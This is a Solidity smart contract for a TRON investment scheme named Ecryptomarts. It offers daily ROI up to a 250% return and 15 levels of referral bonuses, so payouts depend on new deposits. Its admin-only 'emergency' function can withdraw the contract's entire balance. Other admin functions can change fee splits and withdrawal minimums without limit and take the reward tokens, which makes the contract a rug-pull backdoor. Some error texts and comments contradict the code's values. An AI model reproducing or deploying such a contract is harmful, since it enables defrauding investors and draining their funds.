//SourceUnit: Ecryptomarts.sol

/*
 *  
 *   Ecryptomarts
 *   ────────────────────────────────────────────────────────────────────────
 */

pragma solidity ^0.5.10;



library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}


interface IERC20Token
{
    
    function transfer(address _to, uint256 _value) external returns (bool success);
    function balanceOf(address user) external view returns(uint256);
    function totalSupply() external view returns (uint256);
   
}


contract Ecryptomarts {
	using SafeMath for uint256;

	IERC20Token public rewardToken;

	uint256 constant public INVEST_MIN_AMOUNT = 500 trx;
	uint256 constant public DIRECT_REFERRAL_PERCENTS = 800; // 8%
	uint256 constant public DEFAULT_ROI = 50; // 0.5 %
	uint256 constant public PROJECT_FEE = 500; // 5%;
	uint256 constant public PERCENTS_DIVIDER = 10000;
	uint256 constant public TIME_STEP =  1 days; // 1 days,
	

    uint256 public SALES_BOOSTER = 2500;
	uint256 public TOURSTRAVEL = 1500; 
	uint256 public BOT_ALLOCATION = 1500; 

    uint256 public MIN_WITHDRAW = 250 trx;

	uint256 public REWARD_TOKEN_JUSTIFY = 7;
	uint256 public REWARD_TOKEN_DIRECT = 20;
	
	
	
	uint256 public totalUsers;
	uint256 public totalInvested;
	uint256 public totalWithdrawn;
	uint256 public totalDeposits;
	uint[] public ref_bonuses = [20,10,5,5,5,5,4,4,4,4,4,3,3,3,3]; 
	uint[4] public roi_rate = [50,70,85,100];
	uint[4] public rewardTokenMul = [10000,12500,15000,20000];


	address payable public admin;
	address payable public SalesBooster;
	address payable public ToursTravels;
	address payable public BOTallocation;

	

	struct Deposit {
		uint256 amount;
		uint256 withdrawn;
		uint256 start;
		bool end;
		uint256 ROI_rate;
	}

	struct User {
		Deposit[] deposits;
		uint256 checkpoint;
		address referrer;
		uint256 bonus;
		uint256 match_bonus;
		uint256 earlybird_bonus;
		uint256 totalWithdrawn;
		uint256 totalReferrer;
		uint[15] refs;
	}

	mapping (address => User) public users;
	mapping(address => mapping(uint256=>address)) public downline;

	event Newbie(address user);
	event NewDeposit(address indexed user, uint256 amount);
	event Withdrawn(address indexed user, uint256 amount);
	event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
	event FeePayed(address indexed user, uint256 totalAmount);
	event DirectPayout(address indexed addr, address indexed from, uint256 amount);
	event RefDirectBonus(address indexed referrer, address indexed referral, uint256 amount);
	event RefMatchPayout(address indexed referrer, address indexed referral, uint256 amount);

	constructor(IERC20Token _rewardToken, address payable _admin, address payable _SalesBooster,address payable _ToursTravels, address payable _BOTallocation) public {
		require(!isContract(_admin));
		rewardToken = _rewardToken;
		admin = _admin;
		SalesBooster =_SalesBooster;
		ToursTravels = _ToursTravels;
		BOTallocation = _BOTallocation;

	}


	function _refPayout(address _addr, uint256 _amount) private {

		 address up = users[_addr].referrer;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            (uint256 to_payout, uint256 max_payout) = this.payoutOf(up);
            
            uint256 bonus = _amount * ref_bonuses[i] / 100;
            uint remain = (max_payout - users[up].totalWithdrawn.add(to_payout));

            bonus = ( remain > 0 ) ? (remain > bonus) ? bonus : remain : 0;

            users[up].bonus = users[up].bonus.add(bonus);
            emit RefMatchPayout(up, _addr, bonus);
			
            up = users[up].referrer;
        }
    }


	function _DirectPayout(address _addr, uint256 _amount, uint256 _TokenAmount) private {
		 address up = users[_addr].referrer;

		 (uint256 to_payout, uint256 max_payout) = this.payoutOf(up);
		 uint256 bonus = _amount.mul(DIRECT_REFERRAL_PERCENTS).div(PERCENTS_DIVIDER); // 8% matching bonus for 1st level
		 uint remain = (max_payout - users[up].totalWithdrawn.add(to_payout));

		 bonus = ( remain > 0 ) ? (remain > bonus) ? bonus : remain : 0;

		 if (bonus > 0) {
				users[up].match_bonus = users[up].match_bonus.add(bonus);
				emit DirectPayout(up, msg.sender, bonus);
			}

		//// TOKEN TRANSFER

		uint256 TokenBal = rewardToken.balanceOf(address(this));
		if(TokenBal > _TokenAmount){
				_TokenAmount = _TokenAmount.mul(REWARD_TOKEN_DIRECT).div(100);
				rewardToken.transfer(up,_TokenAmount);
			}
	}

	function invest(address referrer, uint8 _roiIndex) public payable {

		
		require(!isContract(msg.sender) && msg.sender == tx.origin);
		require(msg.value >= INVEST_MIN_AMOUNT,'Min invesment 500TRX');
		require(_roiIndex < 4,'ROI Index Not Match!');
	
		User storage user = users[msg.sender];

		if (user.referrer == address(0) && (users[referrer].deposits.length > 0 || referrer == admin) && referrer != msg.sender ) {
            user.referrer = referrer;
        }

		require(user.referrer != address(0) || msg.sender == admin, "No upline");

		if(user.deposits.length > 0){
		  uint previousDeposit = user.deposits[user.deposits.length-1].amount;
		  require(msg.value > previousDeposit.mul(150).div(100) , "Invalid Deposit!");
		}

		
		SalesBooster.transfer(msg.value.mul(SALES_BOOSTER).div(PERCENTS_DIVIDER));
		ToursTravels.transfer(msg.value.mul(TOURSTRAVEL).div(PERCENTS_DIVIDER));
		BOTallocation.transfer(msg.value.mul(BOT_ALLOCATION).div(PERCENTS_DIVIDER));
		

		// setup upline

		if (user.referrer != address(0) && user.deposits.length == 0) {

            address upline = user.referrer;
            for (uint i = 0; i < ref_bonuses.length; i++) {
                if (upline != address(0)) {
                    users[upline].refs[i]++;
					users[upline].totalReferrer++;
					_earlybird(i,upline);
                    upline = users[upline].referrer;
                    
                } else break;
            }
			downline[referrer][users[referrer].refs[0] - 1]= msg.sender;
        }
	
		uint msgValue = msg.value;


			uint256 TokenBal = rewardToken.balanceOf(address(this));
			uint256 TokenAmount = (msgValue.div(1e6).mul(1e8));
			TokenAmount = TokenAmount.mul(REWARD_TOKEN_JUSTIFY).div(100);
			TokenAmount = TokenAmount.mul(rewardTokenMul[_roiIndex]).div(PERCENTS_DIVIDER);
			if(TokenBal > TokenAmount){
				rewardToken.transfer(msg.sender,TokenAmount);
			}
		
		// Direct
		 _DirectPayout(msg.sender,msgValue, TokenAmount);


		if (user.deposits.length == 0) {
			user.checkpoint = block.timestamp;
			totalUsers = totalUsers.add(1);
			emit Newbie(msg.sender);
		}

		user.deposits.push(Deposit(msg.value, 0, block.timestamp,false,_roiIndex));

		totalInvested = totalInvested.add(msg.value);
		totalDeposits = totalDeposits.add(1);


		emit NewDeposit(msg.sender, msg.value);

	}
	
	function _earlybird(uint _index, address _upline) internal{
	    if(_index==0 && users[_upline].refs[_index]==3){
	         uint256 bonus = 0;
	        if(users[_upline].checkpoint + 7 days >= block.timestamp){
	            bonus = 150 trx;
	        }else if(users[_upline].checkpoint + 15 days >= block.timestamp){
	            bonus = 100 trx;
	        }else if(users[_upline].checkpoint + 30 days >= block.timestamp){
	            bonus = 70 trx;
	        }
	        
	        if(bonus > 0){
	            
	                (uint256 to_payout, uint256 max_payout) = this.payoutOf(_upline);
					uint remain = (max_payout - users[_upline].totalWithdrawn.add(to_payout));
					bonus = ( remain > 0 ) ? (remain > bonus) ? bonus : remain : 0;
					users[_upline].earlybird_bonus = users[_upline].earlybird_bonus.add(bonus);
	        }
	    }
	}
	
	

	function withdraw() public {

		User storage user = users[msg.sender];
		(uint256 to_payout, uint256 max_payout) = this.payoutOf(msg.sender);
        
		require(to_payout > 0, "User has no dividends");
		require(to_payout >= MIN_WITHDRAW, "Minimum withdraw 100 trx!");


		uint256 totalAmount;
		uint256 dividends;

		for (uint256 i = 0; i < user.deposits.length; i++) {
		    
		    	uint256 userPercentRate = roi_rate[user.deposits[i].ROI_rate];

				if (user.deposits[i].withdrawn < user.deposits[i].amount.mul(250).div(100)) {

					if (user.deposits[i].start > user.checkpoint) {

						dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
							.mul(block.timestamp.sub(user.deposits[i].start))
							.div(TIME_STEP);

					} else {

						dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
							.mul(block.timestamp.sub(user.checkpoint))
							.div(TIME_STEP);

					}

					if (user.deposits[i].withdrawn.add(dividends) > user.deposits[i].amount.mul(250).div(100)) {     // Deposited Amount × 250 ÷ 100    // = Deposited Amount × 3.65
						dividends = (user.deposits[i].amount.mul(250).div(100)).sub(user.deposits[i].withdrawn);     // Deposited Amount × 2.5 Times Return
					}                                                                                                // Total Return = 250%

					user.deposits[i].withdrawn = user.deposits[i].withdrawn.add(dividends);    // changing of storage data after withdrawal
					totalAmount = totalAmount.add(dividends);

					if(user.totalWithdrawn.add(to_payout) >= max_payout){
						user.deposits[i].withdrawn = user.deposits[i].amount.mul(250).div(100);
					}

				}
			
		}


        


		uint256 referralBonus = getUserReferralBonus(msg.sender);
		if (referralBonus > 0) {
			user.bonus = 0;
		}

		uint256 referralMatchingBonus = getUserReferralMatchingBonus(msg.sender);
		if (referralMatchingBonus > 0) {
			user.match_bonus = 0;
		}

		user.earlybird_bonus = 0;

		
		if(to_payout > 0){
		    _refPayout(msg.sender,to_payout);
		}

		user.checkpoint = block.timestamp;

		msg.sender.transfer(to_payout);

		user.totalWithdrawn = user.totalWithdrawn.add(to_payout);
		totalWithdrawn = totalWithdrawn.add(to_payout);

		emit Withdrawn(msg.sender, to_payout);

	}



	

	function getContractBalance() public view returns (uint256) {
		return address(this).balance;
	}

	function contractInfo() view external returns(uint256 _total_users, uint256 _total_deposited, uint256 _total_withdraw) {
        return (totalUsers, totalInvested, totalWithdrawn);
    }


	

	function getUserDividends(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];

		

		uint256 totalDividends;
		uint256 dividends;



		for (uint256 i = 0; i < user.deposits.length; i++) {
		    
		        uint256 userPercentRate = roi_rate[user.deposits[i].ROI_rate];

				if (user.deposits[i].withdrawn < user.deposits[i].amount.mul(250).div(100)) {

					if (user.deposits[i].start > user.checkpoint) {

						dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
							.mul(block.timestamp.sub(user.deposits[i].start))
							.div(TIME_STEP);

					} else {

						dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
							.mul(block.timestamp.sub(user.checkpoint))
							.div(TIME_STEP);

					}

					if (user.deposits[i].withdrawn.add(dividends) > user.deposits[i].amount.mul(250).div(100)) {
						dividends = (user.deposits[i].amount.mul(250).div(100)).sub(user.deposits[i].withdrawn);
					}

					totalDividends = totalDividends.add(dividends);


				}
			
		}

		return totalDividends;
	}

	function getUserCheckpoint(address userAddress) public view returns(uint256) {
		return users[userAddress].checkpoint;
	}

	function getUserReferrer(address userAddress) public view returns(address) {
		return users[userAddress].referrer;
	}

	function getUserDownlineInfo(address userAddress, uint index) public view returns(uint256) {
		return users[userAddress].refs[index];
	}

	
    function maxPayoutOf(address userAddress) view external returns(uint256) {
		User storage user = users[userAddress];

		uint256 amount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			amount = amount.add(user.deposits[i].amount);
		}
        return amount * 250 / 100;
    }

	function payoutOf(address _addr) view external returns(uint256 payout, uint256 max_payout) {
		User storage user = users[_addr];
        max_payout = this.maxPayoutOf(_addr);


		if(user.totalWithdrawn < max_payout){
			payout = getUserDividends(_addr).add(getUserReferralBonus(_addr)).add(getUserReferralMatchingBonus(_addr)).add(user.earlybird_bonus);

			if(user.totalWithdrawn.add(payout) > max_payout){
				payout = max_payout.sub(user.totalWithdrawn);
			}
		}

    }

	

	function getUserReferralBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].bonus;
	}

	function getUserReferralMatchingBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].match_bonus;
	}

	


	function getUserAvailableBalanceForWithdrawal(address userAddress) public view returns(uint256) {
		return getUserReferralBonus(userAddress).add(getUserReferralMatchingBonus(userAddress).add(getUserDividends(userAddress)));
	}

	

	function getUserDepositInfo(address userAddress, uint256 index) public view returns(uint256, uint256, uint256) {
	    User storage user = users[userAddress];

		return (user.deposits[index].amount, user.deposits[index].withdrawn, user.deposits[index].start);
	}

	function getUserAmountOfDeposits(address userAddress) public view returns(uint256) {
		return users[userAddress].deposits.length;
	}

	function getUserTotalDeposits(address userAddress) public view returns(uint256) {
	    User storage user = users[userAddress];

		uint256 amount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			amount = amount.add(user.deposits[i].amount);
		}

		return amount;
	}

	function getUserTotalWithdrawn(address userAddress) public view returns(uint256) {
	    User storage user = users[userAddress];

		uint256 amount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			amount = amount.add(user.deposits[i].withdrawn);
		}

		return amount;
	}

	function _safeTransfer(address payable _to, uint _amount) internal returns (uint256 amount) {
        amount = (_amount < address(this).balance) ? _amount : address(this).balance;
       _to.transfer(amount);
    }

	function TokenBalanceOfContract() external view returns(uint256){
		return rewardToken.balanceOf(address(this));
	}

	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

	function emergency(uint256 _amount) external {
		require(msg.sender == admin, 'permission denied!');
		_safeTransfer(msg.sender, _amount);
    }

    function update_bot_allocation(uint256 _percent) external {
		require(msg.sender == admin, 'permission denied!');
		BOT_ALLOCATION =_percent;
    }

    function update_sales_booster(uint256 _percent) external {
		require(msg.sender == admin, 'permission denied!');
		SALES_BOOSTER =_percent;
    }

    function update_tours_travels(uint256 _percent) external {
		require(msg.sender == admin, 'permission denied!');
		TOURSTRAVEL =_percent;
    }

    function update_min_withdrawal(uint256 _amount) external {
		require(msg.sender == admin, 'permission denied!');
		MIN_WITHDRAW =_amount;
    }

	function update_reward_token_direct(uint256 _percent) external {
		require(msg.sender == admin, 'permission denied!');
		REWARD_TOKEN_DIRECT =_percent;
    }

	function update_reward_token_justify(uint256 _percent) external {
		require(msg.sender == admin, 'permission denied!');
		REWARD_TOKEN_JUSTIFY =_percent;
    }

	

	
	function TokenTransfer(uint256 _Token) external {
		require(msg.sender == admin, 'permission denied!');
		rewardToken.transfer(msg.sender,_Token);
    }

	

	

	
}